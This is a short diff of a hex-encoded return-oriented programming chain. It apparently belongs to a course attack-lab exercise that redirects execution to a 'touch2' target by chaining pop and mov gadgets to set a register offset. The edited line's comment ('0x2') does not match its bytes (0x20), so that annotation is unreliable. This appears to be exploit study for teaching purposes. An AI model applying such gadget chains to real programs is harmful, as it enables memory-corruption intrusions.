@@ -130,7 +130,7 @@ ec 17 40 00 00 00 00 00 /* goto touch2 */
 
 /* Get offset and move it to %rsi */
 ab 19 40 00 00 00 00 00 /* popq %rax, %rax = offset value */
-40 00 00 00 00 00 00 00 /* offset value = 0x40 */
+20 00 00 00 00 00 00 00 /* offset value = 0x2 */
 dd 19 40 00 00 00 00 00 /* movl %eax, %edx */
 34 1a 40 00 00 00 00 00 /* movl %edx, %ecx */
 13 1a 40 00 00 00 00 00 /* movl %ecx, %esi */
